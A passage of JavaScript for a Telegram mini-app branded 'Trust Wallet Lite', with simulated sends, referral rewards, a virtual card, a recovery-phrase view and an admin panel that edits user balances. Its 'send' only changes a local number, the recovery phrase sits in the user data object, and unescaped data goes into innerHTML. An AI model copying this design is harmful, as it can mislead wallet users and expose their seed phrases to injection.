    showToast(`Withdrawal request submitted for ${amount} ${currency}`, 'success');
}

function showSendModal() {
    const modal = document.getElementById('sendModal');
    if (modal) modal.classList.add('show');
}

function sendTransaction() {
    const currency = document.getElementById('sendCurrency')?.value || 'TWT';
    const amount = parseFloat(document.getElementById('sendAmount')?.value);
    const address = document.getElementById('sendAddress')?.value;
    
    if (!amount || amount <= 0 || !address) {
        showToast('Please fill all fields', 'error');
        return;
    }
    
    if (userData.balances[currency] < amount) {
        showToast(`Insufficient ${currency} balance`, 'error');
        return;
    }
    
    userData.balances[currency] -= amount;
    
    if (!userData.transactions) userData.transactions = [];
    userData.transactions.unshift({
        type: 'send',
        amount: amount,
        currency: currency,
        toAddress: address,
        timestamp: new Date().toISOString()
    });
    
    saveUserData();
    updateUI();
    
    closeModal('sendModal');
    document.getElementById('sendAmount').value = '';
    document.getElementById('sendAddress').value = '';
    
    showToast(`Sent ${amount} ${currency}`, 'success');
}

function showReceiveModal() {
    const modal = document.getElementById('receiveModal');
    if (modal) modal.classList.add('show');
    const addressElement = document.getElementById('receiveAddress');
    if (addressElement && userData) {
        addressElement.textContent = userData.userId;
    }
}

function copyAddress() {
    const address = document.getElementById('receiveAddress')?.textContent;
    if (address) copyToClipboard(address);
}

// ====== 13. HISTORY ======
function showHistory() {
    const modal = document.getElementById('historyModal');
    const list = document.getElementById('historyList');
    if (!modal || !list) return;
    
    const transactions = userData?.transactions || [];
    if (transactions.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:40px;">No transactions yet</div>';
    } else {
        list.innerHTML = transactions.map(tx => {
            const date = new Date(tx.timestamp);
            const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
            let typeText = tx.type;
            let amountText = '';
            
            if (tx.type === 'swap') {
                amountText = `${tx.fromAmount} ${tx.fromCurrency} → ${tx.toAmount} ${tx.toCurrency}`;
            } else if (tx.type === 'send') {
                amountText = `-${tx.amount} ${tx.currency}`;
            } else if (tx.type === 'withdraw') {
                amountText = `-${tx.amount} ${tx.currency} (fee: ${tx.fee})`;
            } else {
                amountText = `${tx.amount} ${tx.currency}`;
            }
            
            return `
                <div class="history-item">
                    <div class="history-item-header">
                        <span class="history-type">${typeText}</span>
                        <span class="history-date">${formattedDate}</span>
                    </div>
                    <div class="history-details">
                        <span class="history-amount">${amountText}</span>
                    </div>
                </div>
            `;
        }).join('');
    }
    modal.classList.add('show');
}

// ====== 14. NOTIFICATIONS ======
function showNotifications() {
    const modal = document.getElementById('notificationsModal');
    const list = document.getElementById('notificationsList');
    if (!modal || !list) return;
    
    const notifications = userData?.notifications || [];
    if (notifications.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:40px;">No notifications</div>';
    } else {
        list.innerHTML = notifications.map(n => `
            <div class="notification-item" style="padding:12px;border-bottom:1px solid var(--border);">
                <div class="notification-message">${n.message}</div>
                <div class="notification-time" style="font-size:10px;color:var(--text-muted);">${new Date(n.timestamp).toLocaleString()}</div>
            </div>
        `).join('');
    }
    modal.classList.add('show');
}

// ====== 15. REFERRAL SECTION ======
function renderReferral() {
    const container = document.getElementById('referralContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="referral-stats">
            <div class="stat-card"><span class="stat-label">${t('referral.totalReferrals')}</span><span class="stat-value" id="totalReferrals">0</span></div>
            <div class="stat-card"><span class="stat-label">${t('referral.twtEarned')}</span><span class="stat-value" id="twtEarned">0 TWT</span></div>
            <div class="stat-card"><span class="stat-label">${t('referral.usdtEarned')}</span><span class="stat-value" id="usdtEarned">0.00 USDT</span></div>
        </div>
        <div class="referral-link-card">
            <div class="link-label">${t('referral.yourLink')}</div>
            <div class="link-container">
                <input type="text" id="referralLink" readonly>
                <button class="copy-btn" onclick="copyReferralLink()"><i class="fa-regular fa-copy"></i></button>
                <button class="share-btn" onclick="shareReferral()"><i class="fa-regular fa-share-from-square"></i></button>
            </div>
        </div>
        <div class="section-header"><h3>${t('referral.milestones')}</h3></div>
        <div class="milestones-list" id="milestonesList"></div>
    `;
    
    updateReferralStats();
    renderReferralMilestones();
}

function updateReferralStats() {
    if (!userData) return;
    const totalReferrals = document.getElementById('totalReferrals');
    const twtEarned = document.getElementById('twtEarned');
    const usdtEarned = document.getElementById('usdtEarned');
    const referralLink = document.getElementById('referralLink');
    
    if (totalReferrals) totalReferrals.textContent = userData.referralCount || 0;
    if (twtEarned) twtEarned.textContent = ((userData.referralCount || 0) * REFERRAL_BONUS) + ' TWT';
    if (usdtEarned) usdtEarned.textContent = (userData.totalUsdtEarned || 0).toFixed(2) + ' USDT';
    if (referralLink) referralLink.value = `${BOT_LINK}?startapp=${userData.referralCode}`;
}

function renderReferralMilestones() {
    const milestonesList = document.getElementById('milestonesList');
    if (!milestonesList || !userData) return;
    
    milestonesList.innerHTML = REFERRAL_MILESTONES.map(milestone => {
        const progress = Math.min((userData.referralCount / milestone.referrals) * 100, 100);
        const canClaim = userData.referralCount >= milestone.referrals && !userData.referralMilestones.find(m => m.referrals === milestone.referrals)?.claimed;
        const isClaimed = userData.referralMilestones.find(m => m.referrals === milestone.referrals)?.claimed;
        
        return `
            <div class="milestone-item">
                <div class="milestone-header">
                    <span class="milestone-referrals"><i class="fa-regular ${milestone.icon}"></i> ${milestone.referrals} Referrals</span>
                    <span class="milestone-reward">${milestone.reward} ${milestone.unit}</span>
                </div>
                <div class="milestone-progress">
                    <div class="progress-bar"><div class="progress-fill" style="width: ${progress}%"></div></div>
                    <span class="progress-text">${userData.referralCount}/${milestone.referrals}</span>
                </div>
                ${canClaim ? `<button class="claim-btn" onclick="claimReferralMilestone(${milestone.referrals})">Claim Reward</button>` : isClaimed ? '<p style="color: var(--success); text-align: center;">✓ Claimed</p>' : ''}
            </div>
        `;
    }).join('');
}

function claimReferralMilestone(referrals) {
    const milestoneIndex = userData.referralMilestones.findIndex(m => m.referrals === referrals);
    if (milestoneIndex === -1 || userData.referralMilestones[milestoneIndex].claimed) return;
    if (userData.referralCount < referrals) {
        showToast(`You need ${referrals} referrals to claim this!`, 'error');
        return;
    }
    
    const reward = REFERRAL_MILESTONES.find(m => m.referrals === referrals).reward;
    userData.balances.USDT = (userData.balances.USDT || 0) + reward;
    userData.totalUsdtEarned = (userData.totalUsdtEarned || 0) + reward;
    userData.referralMilestones[milestoneIndex].claimed = true;
    
    if (!userData.transactions) userData.transactions = [];
    userData.transactions.unshift({
        type: 'referral_reward',
        amount: reward,
        currency: 'USDT',
        details: `Milestone: ${referrals} referrals`,
        timestamp: new Date().toISOString()
    });
    
    saveUserData();
    updateUI();
    updateReferralStats();
    renderReferralMilestones();
    showToast(`Claimed ${reward} USDT!`, 'success');
}

function copyReferralLink() {
    const link = `${BOT_LINK}?startapp=${userData?.referralCode || ''}`;
    copyToClipboard(link);
    showToast(t('success.referralCopied'), 'success');
}

function shareReferral() {
    const text = `🚀 Join Trust Wallet Lite! Use my link: ${BOT_LINK}?startapp=${userData?.referralCode || ''}`;
    if (tg?.shareToStory) tg.shareToStory(text);
    else copyToClipboard(text);
    showToast(t('success.referralCopied'), 'success');
}

// ====== 16. TWT PAY CARD ======
function renderTWTPay() {
    const container = document.getElementById('twtpayContainer');
    if (!container || !userData) return;
    
    const twtBalance = userData.balances.TWT || 0;
    const twtValue = twtBalance * TWT_PRICE;
    const cardNumber = userData.userId?.slice(-4) || '0000';
    
    container.innerHTML = `
        <div class="virtual-card">
            <div class="card-chip"><i class="fas fa-microchip"></i></div>
            <div class="card-brand">TWT Pay</div>
            <div class="card-number"><span>****</span><span>****</span><span>****</span><span>${cardNumber}</span></div>
            <div class="card-details">
                <div><div class="label">Card Holder</div><div class="value">${userData.userName || 'TWT User'}</div></div>
                <div><div class="label">Expires</div><div class="value">12/28</div></div>
            </div>
            <div class="card-balance">
                <div class="balance-label">Available Balance</div>
                <div class="balance-value">${twtBalance.toLocaleString()} TWT</div>
                <div class="balance-usd">≈ $${twtValue.toFixed(2)} USD</div>
            </div>
            <div class="card-footer"><i class="fab fa-visa"></i><span>Virtual Card</span></div>
        </div>
        <div class="card-actions">
            <button class="card-action-btn" onclick="showTopUpModal()"><i class="fas fa-plus-circle"></i><span>Top Up</span></button>
            <button class="card-action-btn" onclick="showCardSettings()"><i class="fas fa-sliders-h"></i><span>Settings</span></button>
            <button class="card-action-btn" onclick="showCardTransactions()"><i class="fas fa-history"></i><span>History</span></button>
        </div>
        <div class="card-features">
            <div class="feature"><i class="fas fa-globe"></i><span>Global</span></div>
            <div class="feature"><i class="fas fa-shield-alt"></i><span>Secure</span></div>
            <div class="feature"><i class="fas fa-percent"></i><span>2% Cashback</span></div>
            <div class="feature"><i class="fas fa-exchange-alt"></i><span>Instant Swap</span></div>
        </div>
    `;
}

function showTopUpModal() { showToast('Top up coming soon!', 'info'); }
function showCardSettings() { showToast('Card settings coming soon!', 'info'); }
function showCardTransactions() { showToast('Coming soon!', 'info'); }

// ====== 17. SETTINGS ======
function renderSettings() {
    const container = document.getElementById('settingsContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="settings-list">
            <div class="settings-item" onclick="showNotifications()"><i class="fas fa-bell"></i><div><div class="label">${t('notifications.title')}</div><div class="desc">View all notifications</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="showHistory()"><i class="fas fa-history"></i><div><div class="label">${t('actions.history')}</div><div class="desc">View all transactions</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="showRecoveryPhrase()"><i class="fas fa-key"></i><div><div class="label">${t('settings.recovery')}</div><div class="desc">View your backup phrase</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="toggleLanguage()"><i class="fas fa-language"></i><div><div class="label">${t('settings.language')}</div><div class="desc">${currentLanguage === 'en' ? 'English / العربية' : 'العربية / English'}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="toggleTheme()"><i class="fas fa-moon"></i><div><div class="label">${t('settings.theme')}</div><div class="desc">${currentTheme === 'dark' ? 'Dark Mode' : 'Light Mode'}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i><div><div class="label">${t('settings.logout')}</div><div class="desc">Sign out of your wallet</div></div></div>
        </div>
        <div style="text-align:center;margin-top:24px;"><span style="font-size:10px;">Trust Wallet Lite v3.2</span></div>
    `;
}

function showRecoveryPhrase() {
    const modal = document.getElementById('recoveryModal');
    const display = document.getElementById('recoveryPhraseDisplay');
    if (!modal || !display) return;
    
    const phrase = userData?.recoveryPhrase || 'No recovery phrase found';
    display.innerHTML = `<div class="recovery-box" style="background:var(--bg-secondary);padding:20px;border-radius:12px;word-break:break-all;">${phrase}</div>`;
    modal.classList.add('show');
}

function copyRecoveryPhrase() {
    if (userData?.recoveryPhrase) {
        copyToClipboard(userData.recoveryPhrase);
    }
}

function logout() {
    if (confirm('Are you sure you want to logout?')) {
        localStorage.removeItem(`user_${userData?.userId}`);
        localStorage.removeItem('twt_user_id');
        userData = null;
        location.reload();
    }
}

// ====== 18. ADMIN PANEL ======
function showAdminPanel() {
    if (!isAdmin) {
        showToast('Access denied', 'error');
        return;
    }
    const panel = document.getElementById('adminPanel');
    if (panel) panel.classList.remove('hidden');
    refreshAdminPanel();
}

function closeAdminPanel() {
    const panel = document.getElementById('adminPanel');
    if (panel) panel.classList.add('hidden');
}

async function refreshAdminPanel() {
    if (!isAdmin || !db) return;
    
    const content = document.getElementById('adminContent');
    if (!content) return;
    
    content.innerHTML = '<div style="text-align:center;padding:20px;"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';
    
    try {
        const withdrawalsSnapshot = await db.collection('users').get();
        let totalUsers = 0;
        let pendingWithdrawals = 0;
        
        withdrawalsSnapshot.forEach(doc => {
            totalUsers++;
            const user = doc.data();
            if (user.withdrawalRequests) {
                pendingWithdrawals += user.withdrawalRequests.filter(w => w.status === 'pending').length;
            }
        });
        
        content.innerHTML = `
            <div class="stats-grid">
                <div class="stat-card"><h3>Total Users</h3><div class="stat-value">${totalUsers}</div></div>
                <div class="stat-card"><h3>Pending Withdrawals</h3><div class="stat-value">${pendingWithdrawals}</div></div>
                <div class="stat-card"><h3>TWT Price</h3><div class="stat-value">$${TWT_PRICE.toFixed(4)}</div></div>
            </div>
            <div style="margin-top:20px;">
                <input type="text" id="adminSearchUser" placeholder="Search by User ID" style="width:100%;padding:12px;border-radius:12px;border:1px solid var(--border);background:var(--bg-secondary);color:var(--text-primary);">
                <button onclick="adminLoadUser()" class="btn-primary" style="margin-top:10px;width:100%;">Search User</button>
            </div>
            <div id="adminUserResult" style="margin-top:20px;"></div>
        `;
    } catch (error) {
        console.error("Admin refresh error:", error);
        content.innerHTML = '<div style="text-align:center;padding:20px;color:var(--danger);">Error loading admin panel</div>';
    }
}

async function adminLoadUser() {
    const searchInput = document.getElementById('adminSearchUser');
    const targetUserId = searchInput?.value.trim();
    if (!targetUserId) {
        showToast('Enter User ID', 'error');
        return;
    }
    
    const resultDiv = document.getElementById('adminUserResult');
    resultDiv.innerHTML = '<div style="text-align:center;padding:20px;"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';
    
    try {
        const userDoc = await db.collection('users').doc(targetUserId).get();
        if (!userDoc.exists) {
            resultDiv.innerHTML = '<div style="text-align:center;padding:20px;color:var(--danger);">User not found</div>';
            return;
        }
        
        const user = userDoc.data();
        resultDiv.innerHTML = `
            <div style="background:var(--bg-card);border-radius:16px;padding:16px;">
                <h4>User: ${user.userName || 'User'}</h4>
                <p>ID: ${user.userId}</p>
                <p>Referrals: ${user.referralCount || 0}</p>
                <div style="margin:10px 0;">
                    <strong>Balances:</strong>
                    ${Object.entries(user.balances || {}).filter(([_,v]) => v > 0).map(([c,v]) => `<span style="display:inline-block;margin:4px;padding:4px 8px;background:var(--bg-secondary);border-radius:8px;">${c}: ${v}</span>`).join('')}
                </div>
                <div style="display:flex;gap:10px;margin-top:15px;">
                    <button onclick="adminAddBalance('${targetUserId}')" style="flex:1;background:var(--success);border:none;padding:10px;border-radius:8px;cursor:pointer;">Add Balance</button>
                    <button onclick="adminRemoveBalance('${targetUserId}')" style="flex:1;background:var(--danger);border:none;padding:10px;border-radius:8px;cursor:pointer;">Remove Balance</button>
                </div>
            </div>
        `;
    } catch (error) {
        resultDiv.innerHTML = '<div style="text-align:center;padding:20px;color:var(--danger);">Error loading user</div>';
    }
}

async function adminAddBalance(targetUserId) {
    const currency = prompt('Currency (TWT, USDT, etc.):', 'TWT');
    if (!currency) return;
    const amount = parseFloat(prompt(`Amount to ADD (${currency}):`, '0'));
    if (isNaN(amount) || amount <= 0) return;
    
    try {
        const userRef = db.collection('users').doc(targetUserId);
        const userDoc = await userRef.get();
        const currentBalance = userDoc.data()?.balances?.[currency] || 0;
        
        await userRef.update({
            [`balances.${currency}`]: currentBalance + amount
        });
        
        showToast(`✅ Added ${amount} ${currency}`, 'success');
        if (targetUserId === userData?.userId) {
            userData.balances[currency] = (userData.balances[currency] || 0) + amount;
            saveUserData();
            updateUI();
        }
        adminLoadUser();
    } catch (error) {
        showToast('Error adding balance', 'error');
    }
}

async function adminRemoveBalance(targetUserId) {
    const currency = prompt('Currency (TWT, USDT, etc.):', 'TWT');
    if (!currency) return;
    const amount = parseFloat(prompt(`Amount to REMOVE (${currency}):`, '0'));
    if (isNaN(amount) || amount <= 0) return;
    
    try {
        const userRef = db.collection('users').doc(targetUserId);
        const userDoc = await userRef.get();
        const currentBalance = userDoc.data()?.balances?.[currency] || 0;
        const newBalance = Math.max(0, currentBalance - amount);
        
        await userRef.update({
            [`balances.${currency}`]: newBalance
        });
        
        showToast(`✅ Removed ${amount} ${currency}`, 'success');
        if (targetUserId === userData?.userId) {
            userData.balances[currency] = newBalance;
            saveUserData();
            updateUI();
        }
        adminLoadUser();
    } catch (error) {
        showToast('Error removing balance', 'error');
    }
}

// ====== 19. NAVIGATION ======
function showMainApp() {
    const onboarding = document.getElementById('onboardingScreen');
    const main = document.getElementById('mainContent');
    if (onboarding) onboarding.style.display = 'none';
    if (main) main.style.display = 'block';
    showWallet();
    showRandomSticker();
}

function showWallet() {
    currentPage = 'wallet';
    document.getElementById('walletSection').classList.remove('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="wallet"]')?.classList.add('active');
    
    renderWallet();
    showRandomSticker();
}

function showSwap() {
    currentPage = 'swap';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.remove('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="swap"]')?.classList.add('active');
    
    renderSwap();
    showRandomSticker();
}

function showReferral() {
    currentPage = 'referral';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.remove('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="referral"]')?.classList.add('active');
    
    renderReferral();
    showRandomSticker();
}

function showTWTPay() {
    currentPage = 'twtpay';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.remove('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="twtpay"]')?.classList.add('active');
    
    renderTWTPay();
    showRandomSticker();
}

function showSettings() {
    currentPage = 'settings';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.remove('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="settings"]')?.classList.add('active');
    
    renderSettings();
    showRandomSticker();
}

// ====== 20. INITIALIZATION ======
document.addEventListener('DOMContentLoaded', async () => {
    // Setup language
    if (currentLanguage === 'ar') {
        document.body.classList.add('rtl');
        document.documentElement.dir = 'rtl';
        const flagEl = document.getElementById('currentLanguageFlag');
        if (flagEl) flagEl.textContent = '🇸🇦';
    } else {
        const flagEl = document.getElementById('currentLanguageFlag');
        if (flagEl) flagEl.textContent = '🇬🇧';
    }
    
    // Setup theme
    initTheme();
    
    // Setup navigation
    document.querySelectorAll('.nav-item').forEach(btn => {
        btn.addEventListener('click', () => {
            const tab = btn.getAttribute('data-tab');
            if (tab === 'wallet') showWallet();
            else if (tab === 'swap') showSwap();
            else if (tab === 'referral') showReferral();
            else if (tab === 'twtpay') showTWTPay();
            else if (tab === 'settings') showSettings();
        });
    });
    
    // Setup onboarding buttons
    const createBtn = document.getElementById('createWalletBtn');
    const importBtn = document.getElementById('importWalletBtn');
    const confirmImportBtn = document.getElementById('confirmImportBtn');
    
    if (createBtn) createBtn.onclick = () => createNewWallet();
    if (importBtn) importBtn.onclick = () => showImportModal();
    if (confirmImportBtn) confirmImportBtn.onclick = () => importWallet();
    
    // Load existing user
    const hasUser = loadUserData();
    await fetchLivePrices();
    
    if (hasUser) {
        showMainApp();
        updateUI();
        checkAdminAndAddCrown();
    } else {
        const onboarding = document.getElementById('onboardingScreen');
        const main = document.getElementById('mainContent');
        if (onboarding) onboarding.style.display = 'flex';
        if (main) main.style.display = 'none';
    }
    
    // Hide splash screen
    setTimeout(() => {
        const splash = document.getElementById('splashScreen');
        if (splash) splash.classList.add('hidden');
    }, 1500);
    
    // Setup scroll to top
    const scrollBtn = document.getElementById('scrollTopBtn');
    if (scrollBtn) {
        window.addEventListener('scroll', () => {
            if (window.scrollY > 300) scrollBtn.classList.add('show');
            else scrollBtn.classList.remove('show');
        });
    }
    
    console.log("✅ Trust Wallet Lite v3.2 - Full Version Initialized");
});

// ====== 21. EXPOSE GLOBAL FUNCTIONS ======
window.showWallet = showWallet;
window.showSwap = showSwap;
window.showReferral = showReferral;
window.showTWTPay = showTWTPay;
window.showSettings = showSettings;
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showSendModal = showSendModal;
window.showReceiveModal = showReceiveModal;
window.showHistory = showHistory;
window.showNotifications = showNotifications;
window.showAdminPanel = showAdminPanel;
window.closeModal = closeModal;
window.closeAdminPanel = closeAdminPanel;
window.refreshPrices = refreshPrices;
window.calculateSwap = calculateSwap;
window.confirmSwap = confirmSwap;
window.setSwapPercentage = setSwapPercentage;
window.swapDirection = swapDirection;
window.sendTransaction = sendTransaction;
window.submitWithdraw = submitWithdraw;
window.copyAddress = copyAddress;
window.copyDepositAddress = copyDepositAddress;
window.copyReferralLink = copyReferralLink;
window.shareReferral = shareReferral;
window.claimReferralMilestone = claimReferralMilestone;
window.showRecoveryPhrase = showRecoveryPhrase;
window.copyRecoveryPhrase = copyRecoveryPhrase;
window.logout = logout;
window.showTopUpModal = showTopUpModal;
window.showCardSettings = showCardSettings;
window.showCardTransactions = showCardTransactions;
window.toggleLanguage = toggleLanguage;
window.toggleTheme = toggleTheme;
window.scrollToTop = scrollToTop;
window.copyToClipboard = copyToClipboard;
window.showAssetDetails = showAssetDetails;
window.showAssetsTab = showAssetsTab;
window.showStakingTab = showStakingTab;
window.showSwapCurrencySelector = showSwapCurrencySelector;
window.selectSwapCurrency = selectSwapCurrency;
window.createNewWallet = createNewWallet;
window.importWallet = importWallet;
window.adminLoadUser = adminLoadUser;
window.adminAddBalance = adminAddBalance;
window.adminRemoveBalance = adminRemoveBalance;
window.refreshAdminPanel = refreshAdminPanel;

console.log("✅ Trust Wallet Lite v3.2 - All features ready!");
